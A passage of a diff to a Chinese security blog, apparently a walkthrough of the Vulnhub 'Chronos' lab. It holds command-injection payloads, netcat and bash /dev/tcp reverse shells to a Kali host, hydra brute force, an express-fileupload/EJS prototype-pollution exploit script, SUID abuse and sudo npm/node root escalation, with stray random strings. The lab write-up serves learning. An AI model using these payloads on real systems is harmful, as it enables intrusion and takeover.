一下</span></span><br><span class="line">&#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;;ls</span><br><span class="line"></span><br><span class="line">6o4pVfNt5u68hvKNrAyNuyr7at25Ddm18CEZm8JmX2GYysMajgLA</span><br></pre></td></tr></table></figure>
 
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830231307794.png" alt="image-20230830231307794"></p>
 <ul>
-<li>发现闭合符号为双引号，尝试闭合：</li>
+<li>拿去 BurpSuite 执行以下：</li>
 </ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&quot; or 1 = 1 --+</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222404690.png" alt="image-20230830222404690"></p>
-<ul>
-<li>闭合成功，按钮变为 Scan，扫个 hello 试试：</li>
-</ul>
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222417126.png" alt="image-20230830222417126"></p>
-<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><ul>
-<li>猜测后端代码逻辑为，尝试是否存在命令执行：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scan hello</span><br><span class="line"></span><br><span class="line">scan hello ; ls</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>发现执行成功，显示出文件：</li>
-</ul>
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222437476.png" alt="image-20230830222437476"></p>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830231315785.png" alt="image-20230830231315785"></p>
 <h1 id="Shell-反弹"><a href="#Shell-反弹" class="headerlink" title="Shell 反弹"></a>Shell 反弹</h1><ul>
-<li>由于对端是 Linux 系统，查看一下是否存在 NC：</li>
+<li>既然可以命令执行，看看有木有 NC 存在：</li>
 </ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hello | which nc</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;;ls /bin</span><br><span class="line"></span><br><span class="line">3tMMgHUnzUbrMNnoRimpQhWEkSPfyktyDehmp58hDsbcctg2FwKoAPUxhaD</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222459677.png" alt="image-20230830222459677"></p>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830231342414.png" alt="image-20230830231342414"></p>
 <ul>
-<li>发现存在有 NC，使用 NC 进行 Shell 反弹：</li>
+<li>存在 NC，使用 NC 反弹个 Shell：</li>
 </ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Kali 上使用 NC 开启监听</span></span><br><span class="line">nc -lvvp 4444</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nc -lvvp 4444                     </span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在靶机上进行反弹</span></span><br><span class="line">hello | nc 192.168.56.105 4444 -e /bin/sh # 执行失败，可能是此版本的 NC 不支持 -e 参数</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在 Kali 上开启两个监听端口</span></span><br><span class="line">nc -lvvp 3333</span><br><span class="line">nc -lvvp 4444</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在靶机上反弹</span></span><br><span class="line">hello |nc 192.168.56.105 3333 |/bin/bash |nc 192.168.56.105 4444 # 当不支持 -e 参数时，使用 NC 进行串联</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在 Kali 上开启监听</span></span><br><span class="line">nc -lvvp 4444</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">命令执行命令如下</span></span><br><span class="line">&#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;| nc 192.168.56.105 4444 -e /bin/sh</span><br><span class="line">2iqHDnc3ghAWrH6eKvF1B8PMgoR7ysZomGDJB2VjxsbCLgGKhqyCHk66Hu1nGdhT7rU37MaUeZNFSuj3ECMRpKQiQQFGP5x3 # 直接显示 Something went wrong，看来目标是不带 -e 的 NC 版本</span><br><span class="line"></span><br><span class="line">&#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;| nc 192.168.56.105 4444 | /bin/sh | nc 192.168.56.105 5555</span><br><span class="line">hAtTz52SG2QaueigHmowMJFzXCfFzkS9eFGpvwsi4DFhw6twhFo58YK7E7z3LQ7vFW7Viw8J54wXPBtPjC2mgBZUs8BXfcLnUjxDTFc6GYheEdjG4DnQ5mtrMELCg9F2</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222511694.png" alt="image-20230830222511694"></p>
-<h1 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h1><ul>
-<li>在当前目录下发现了一个 SQL 文件，使用 NC 将其下载到 Kali 上：</li>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830231403041.png" alt="image-20230830231403041"></p>
+<h1 id="Express-fileupload-提权"><a href="#Express-fileupload-提权" class="headerlink" title="Express-fileupload 提权"></a>Express-fileupload 提权</h1><ul>
+<li>查看一下靶机当前用户信息：</li>
 </ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在 Kali 上再开一个 NC 监听用于传输文件</span></span><br><span class="line">nc -lvvp 5555</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在 NC 的 3333 端口上进行文件传输</span></span><br><span class="line">nc 192.168.56.105 5555 &lt; database.sql</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222530665.png" alt="image-20230830222530665"></p>
-<ul>
-<li>经过判断，发现是一个 sqlite 文件，将其导入到 sqlite 中查看：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# sqlite3</span><br><span class="line">SQLite version 3.39.2 2022-07-21 15:24:47</span><br><span class="line">Enter &quot;.help&quot; for usage hints.</span><br><span class="line">Connected to a transient in-memory database.</span><br><span class="line">Use &quot;.open FILENAME&quot; to reopen on a persistent database.</span><br><span class="line"><span class="meta prompt_">sqlite&gt; </span><span class="language-bash">.open db.sql</span></span><br><span class="line"><span class="meta prompt_">sqlite&gt; </span><span class="language-bash">.database</span></span><br><span class="line">main: /root/db.sql r/w</span><br><span class="line"><span class="meta prompt_">sqlite&gt; </span><span class="language-bash">.dump</span></span><br><span class="line">PRAGMA foreign_keys=OFF;</span><br><span class="line">BEGIN TRANSACTION;</span><br><span class="line">CREATE TABLE `code` (</span><br><span class="line">        `password`      TEXT</span><br><span class="line">);</span><br><span class="line">INSERT INTO code VALUES(&#x27;myinvitecode123&#x27;);</span><br><span class="line">INSERT INTO code VALUES(&#x27;mysecondinvitecode&#x27;);</span><br><span class="line">INSERT INTO code VALUES(&#x27;cloudavtech&#x27;);</span><br><span class="line">INSERT INTO code VALUES(&#x27;mostsecurescanner&#x27;);</span><br><span class="line">COMMIT;</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">id</span></span></span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">whoami</span></span></span><br><span class="line">www-data</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> /etc/passwd</span></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">......</span><br><span class="line">imera:x:1000:1000:imera:/home/imera:/bin/bash</span><br></pre></td></tr></table></figure>
 
 <ul>
-<li>建档尝试了一下，发现是开头登录的邀请码，好像没啥用，那就先放一放。</li>
-<li>查看一下当前靶机的所有用户：</li>
+<li>发现有一个 imera 用户，去它的家目录看看：</li>
 </ul>
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222622625.png" alt="image-20230830222622625"></p>
-<ul>
-<li>发现两个用户，但是好像也没用。</li>
-</ul>
-<h1 id="SSH-爆破"><a href="#SSH-爆破" class="headerlink" title="SSH 爆破"></a>SSH 爆破</h1><ul>
-<li>根据上面数据库文件找到的密码和此处找到的用户，使用 hydra 进行爆破：</li>
-<li>创建用户、密码字典：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">user.txt</span></span><br><span class="line">vim user.txt</span><br><span class="line"></span><br><span class="line">root</span><br><span class="line">cloudav</span><br><span class="line">scanner</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">pass.txt</span></span><br><span class="line">vim pass.txt</span><br><span class="line"></span><br><span class="line">myinvitecode123</span><br><span class="line">mysecondinvitecode</span><br><span class="line">cloudavtech</span><br><span class="line">mostsecurescanner</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">ls</span> /home/imera</span></span><br><span class="line">user.txt</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">ls</span> -l /home/imera</span></span><br><span class="line">-rw------- 1 imera imera 37 Aug  3  2021 user.txt</span><br></pre></td></tr></table></figure>
 
 <ul>
-<li>输入如下命令进行 SSH 爆破：</li>
+<li><p>发现一个 user.txt 文件，但是权限不够无法查看文件内容。那作者的意图很明显，需要我们提权到 imera 用户或者 root 用户去打开这个文件。</p>
+</li>
+<li><p>查看一个当前靶机信息：</p>
+</li>
 </ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -L user.txt -P pass.txt ssh://192.168.56.107</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222647291.png" alt="image-20230830222647291"></p>
-<ul>
-<li>爆破失败..</li>
-</ul>
-<h1 id="SUID-提权"><a href="#SUID-提权" class="headerlink" title="SUID 提权"></a>SUID 提权</h1><ul>
-<li>再次去翻一翻文件，发现一个文件的权限不大对劲：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd .. | ls -al</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222707568.png" alt="image-20230830222707568"></p>
-<ul>
-<li>查看一下源码文件内容：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat update_cloudav.c</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">char *freshclam=&quot;/usr/bin/freshclam&quot;;</span><br><span class="line"></span><br><span class="line">if (argc &lt; 2)&#123;</span><br><span class="line">printf(&quot;This tool lets you update antivirus rules\nPlease supply command line arguments for freshclam\n&quot;);</span><br><span class="line">return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">char *command = malloc(strlen(freshclam) + strlen(argv[1]) + 2);</span><br><span class="line">sprintf(command, &quot;%s %s&quot;, freshclam, argv[1]);</span><br><span class="line">setgid(0);</span><br><span class="line">setuid(0);</span><br><span class="line">system(command);</span><br><span class="line">return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">uname</span> -a</span></span><br><span class="line">Linux chronos 4.15.0-151-generic #157-Ubuntu SMP Fri Jul 9 23:07:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">lsb_release -a</span></span><br><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description:    Ubuntu 18.04.1 LTS</span><br><span class="line">Release:        18.04</span><br><span class="line">Codename:       bionic</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span></span><br><span class="line">......</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line">/usr/bin/traceroute6.iputils</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/newgidmap</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
 
 <ul>
-<li>其中有句：<code>This tool lets you update antivirus rules, Please supply command line arguments for freshclam</code>，翻译一下是说明可以在后面添加参数，尝试一下：</li>
+<li>内核版本比较高，SUID 没有可利用文件。查看靶机开放的端口：</li>
 </ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">随便加一个参数</span></span><br><span class="line">./update_cloudav &quot;123&quot; # 显示报错：ERROR: /var/log/clamav/freshclam.log is locked by another process</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">不管他，尝试命令执行</span></span><br><span class="line">./update_cloudav &quot;123 | ls&quot; # 执行成功！</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">netstat -ntlp</span></span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line">tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp6       0      0 :::8000                 :::*                    LISTEN      852/node            </span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      -                   </span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      -</span><br></pre></td></tr></table></figure>
 
 <ul>
-<li>既然上述命令执行可以实现，再来一次 NC Shell 反弹：</li>
+<li>发现有一个只能在本机访问的 8080 端口。重来，查看文件，找一下 8080 的服务：</li>
 </ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在 Kali 上开启两个监听端口</span></span><br><span class="line">nc -lvvp 6666</span><br><span class="line">nc -lvvp 7777</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在靶机上反弹</span></span><br><span class="line">./update_cloudav &quot;123 |nc 192.168.56.105 6666 |/bin/bash |nc 192.168.56.105 7777&quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">app.js</span><br><span class="line">node_modules</span><br><span class="line">package.json</span><br><span class="line">package-lock.json</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> app.js</span></span><br><span class="line">......</span><br><span class="line">const port = 8000; # 发现是一个 8000 端口的 Web 服务</span><br><span class="line">......</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cd</span> .. ; <span class="built_in">ls</span></span></span><br><span class="line">chronos</span><br><span class="line">chronos-v2 # 发现一个 v2 版本的，很有可能就是我们需要的东西</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cd</span> chronos-v2;<span class="built_in">ls</span></span></span><br><span class="line">backend # 后端目录</span><br><span class="line">frontend</span><br><span class="line">index.html</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">ls</span> backend</span></span><br><span class="line">node_modules</span><br><span class="line">package.json</span><br><span class="line">package-lock.json</span><br><span class="line">server.js</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> server.js</span></span><br><span class="line">const express = require(&#x27;express&#x27;);</span><br><span class="line">const fileupload = require(&quot;express-fileupload&quot;);</span><br><span class="line">const http = require(&#x27;http&#x27;)</span><br><span class="line"></span><br><span class="line">const app = express();</span><br><span class="line"></span><br><span class="line">app.use(fileupload(&#123; parseNested: true &#125;));</span><br><span class="line"></span><br><span class="line">app.set(&#x27;view engine&#x27;, &#x27;ejs&#x27;);</span><br><span class="line">app.set(&#x27;views&#x27;, &quot;/opt/chronos-v2/frontend/pages&quot;);</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">   res.render(&#x27;index&#x27;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">const server = http.Server(app);</span><br><span class="line">const addr = &quot;127.0.0.1&quot;</span><br><span class="line">const port = 8080; 				# 找到了</span><br><span class="line">server.listen(port, addr, () =&gt; &#123;</span><br><span class="line">   console.log(&#x27;Server listening on &#x27; + addr + &#x27; port &#x27; + port);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> package.json</span></span><br><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;some-website&quot;,</span><br><span class="line">  &quot;version&quot;: &quot;1.0.0&quot;,</span><br><span class="line">  &quot;description&quot;: &quot;&quot;,</span><br><span class="line">  &quot;main&quot;: &quot;server.js&quot;,</span><br><span class="line">  &quot;scripts&quot;: &#123;</span><br><span class="line">    &quot;start&quot;: &quot;node server.js&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;author&quot;: &quot;&quot;,</span><br><span class="line">  &quot;license&quot;: &quot;ISC&quot;,</span><br><span class="line">  &quot;dependencies&quot;: &#123;</span><br><span class="line">    &quot;ejs&quot;: &quot;^3.1.5&quot;,</span><br><span class="line">    &quot;express&quot;: &quot;^4.17.1&quot;,</span><br><span class="line">    &quot;express-fileupload&quot;: &quot;^1.1.7-alpha.3&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ps -aux | grep imera</span></span><br><span class="line">imera      838  0.0  2.9 599120 38444 ?        Ssl  13:26   0:00 /usr/local/bin/node /opt/chronos-v2/backend/server.js</span><br><span class="line">www-data  1475  0.0  0.0  13144  1036 ?        S    14:11   0:00 grep imera</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222824468.png" alt="image-20230830222824468"></p>
 <ul>
-<li>提权成功！打靶结束。</li>
+<li><p>由于对 node.js 不太熟悉，经过他人提示，发现  express-fileupload 用于上载文件的中间件。百度一下看看有木有漏洞：</p>
+<ul>
+<li>漏洞文章：<a href="https://www.sohu.com/a/412389503_100002744">https://www.sohu.com/a/412389503_100002744</a></li>
+<li>漏洞原理：<a href="https://www.bleepingcomputer.com/news/security/nodejs-module-downloaded-7m-times-lets-hackers-inject-code/">https://www.bleepingcomputer.com/news/security/nodejs-module-downloaded-7m-times-lets-hackers-inject-code/</a></li>
+<li>漏洞博客：<a href="https://blog.p6.is/Real-World-JS-1/">https://blog.p6.is/Real-World-JS-1/</a></li>
+<li>exp 地址：<a href="https://github.com/boiledsteak/EJS-Exploit">https://github.com/boiledsteak/EJS-Exploit</a></li>
+</ul>
+</li>
+<li><p>exp 代码如下，在 Kali 上进行创建 exp.py 文件：</p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">### imports</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">### commands to run on victim machine</span></span><br><span class="line">cmd = <span class="string">&#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/192.168.56.105/6666 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Starting Attack...&quot;</span>)</span><br><span class="line"><span class="comment">### pollute</span></span><br><span class="line">requests.post(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>, files = &#123;<span class="string">&#x27;__proto__.outputFunctionName&#x27;</span>: (</span><br><span class="line">    <span class="literal">None</span>, <span class="string">f&quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;<span class="subst">&#123;cmd&#125;</span>&#x27;);x&quot;</span>)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">### execute command</span></span><br><span class="line">requests.get(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Finished!&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在 Kali 上开启 Web 服务，在靶机上进行 exp 下载：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 开启 Web 服务</span><br><span class="line">python3 -m http.server 80</span><br><span class="line"></span><br><span class="line"># 开启监听</span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nc -lvvp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"></span><br><span class="line"># 查看是否有下载工具 wget 执行环境 Python</span><br><span class="line">which wget</span><br><span class="line">/usr/bin/wget</span><br><span class="line"></span><br><span class="line">which python</span><br><span class="line">/usr/bin/python3</span><br><span class="line"></span><br><span class="line"># exp 下载</span><br><span class="line">cd /tmp # tmp 目录权限大</span><br><span class="line">python3 exp.py</span><br><span class="line"></span><br><span class="line"># 监听成功</span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nc -lvvp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [192.168.56.105] from chronos.local [192.168.56.108] 41022</span><br><span class="line">bash: cannot set terminal process group (838): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">imera@chronos:/opt/chronos-v2/backend$</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830231601486.png" alt="image-20230830231601486"></p>
+<ul>
+<li>获得了 imera 用户的权限，查看一下之前看不了的 user.txt 文件：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">imera@chronos:~$ cat user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">byBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>得到第一个 <code>flag：byBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK</code>（时间飞逝我的朋友）</li>
+</ul>
+<h1 id="Sudo-提权"><a href="#Sudo-提权" class="headerlink" title="Sudo 提权"></a>Sudo 提权</h1><ul>
+<li>还差一个 flag，但是在进入 root 目录时，还是显示权限不够：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">imera@chronos:~$ cd /root</span><br><span class="line">cd /root</span><br><span class="line">bash: cd: /root: Permission denied</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>说明，还要进行一次提权，通过信息收集，发现 sudo 命令有提权的可能：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">imera@chronos:~$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for imera on chronos:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User imera may run the following commands on chronos:</span><br><span class="line">    (ALL) NOPASSWD: /usr/local/bin/npm *</span><br><span class="line">    (ALL) NOPASSWD: /usr/local/bin/node *</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>通过 GTFOBins 网站的查找，发现 npm 和 node 命令都存在提权的可能，依次尝试一下：</p>
+<ul>
+<li>GTFOBins：<a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></li>
+</ul>
+</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">npm 提权</span></span><br><span class="line">imera@chronos:~$ TF=$(mktemp -d)</span><br><span class="line">TF=$(mktemp -d)</span><br><span class="line">imera@chronos:~$ echo &#x27;&#123;&quot;scripts&quot;: &#123;&quot;preinstall&quot;: &quot;/bin/sh&quot;&#125;&#125;&#x27; &gt; $TF/package.json</span><br><span class="line">&lt;ts&quot;: &#123;&quot;preinstall&quot;: &quot;/bin/sh&quot;&#125;&#125;&#x27; &gt; $TF/package.json</span><br><span class="line">imera@chronos:~$ sudo npm -C $TF --unsafe-perm i</span><br><span class="line">sudo npm -C $TF --unsafe-perm i</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">preinstall</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">/bin/sh</span></span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">uid=1000(imera) gid=1000(imera) groups=1000(imera)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">node 提权</span></span><br><span class="line">imera@chronos:~$ sudo node -e &#x27;require(&quot;child_process&quot;).spawn(&quot;/bin/sh&quot;, &#123;stdio: [0, 1, 2]&#125;)&#x27;</span><br><span class="line">&lt;ild_process&quot;).spawn(&quot;/bin/sh&quot;, &#123;stdio: [0, 1, 2]&#125;)&#x27;</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>通过 node 提权成功~，去 root 目录查看：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls</span><br><span class="line">root.txt</span><br><span class="line">cat root.txt</span><br><span class="line">YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>得到第二个 <code>flag：YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK</code>（今晚我们在沉默中收集梦想）</li>
+<li>打靶结束~</li>
 </ul>
 <h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><ul>
-<li>在使用 SQL 注入时，也可以使用 BurpSuite 进行爆破，但是很容易扫崩，需要控制一下速率。</li>
+<li>在查看 NC 时，用 which nc 会直接卡住，建议用 ls &#x2F;bin。</li>
+<li>一旦出现页面不显示时间信息时，重启靶机。</li>
 </ul>
 ]]></content>
       <categories>
@@ -1441,170 +1637,6 @@
       </categories>
       <tags>
         <tag>Vulnhub_Kali</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>提问的艺术</title>
-    <url>/2023/06/29/%E9%9A%8F%E7%AC%94/01.%E6%8F%90%E9%97%AE%E7%9A%84%E8%89%BA%E6%9C%AF_20230629/</url>
-    <content><![CDATA[<ul>
-<li>提问的艺术是一门重要的沟通技巧，旨在通过巧妙的问题构建实质性对话。当讲师这几年也遇到非常多人、非常多事儿，其中最令人烦躁的还是与学生的提问沟通之中的琐碎事宜。</li>
-</ul>
-<h1 id="自己动手、丰衣足食"><a href="#自己动手、丰衣足食" class="headerlink" title="自己动手、丰衣足食"></a>自己动手、丰衣足食</h1><ul>
-<li>在学校里，老师总是这样教我们：有不懂的问老师、同学帮忙解决。</li>
-<li>但老师也会说：先自己动脑思考，实在想不出再寻求别人的帮助。</li>
-<li>从而我们可以看出：提问的前提是 - “<strong>自己先去尝试解决问题</strong>“。</li>
-</ul>
-<hr style="height:1px;border:none;border-top:1px solid #f8f8f8;" />
-
-<ul>
-<li>我相信很多群里都有这样的幽默公告：</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本群已和谷歌、百度、360、搜狗、必应等搜索引擎公司达成战略合作，有什么疑问可以先咨询他们，不用在群里问了。</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>或者说是如下的表情包（可能会引起部分人的不适）：</li>
-</ul>
-<img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/suibi_20230830 (2).png" alt="suibi_20230830 (2)" />
-
-<img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/suibi_20230830 (1).png" alt="suibi_20230830 (1)" />
-
-<img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/suibi_20230830 (3).png" alt="suibi_20230830 (3)" style="zoom:80%;" />
-
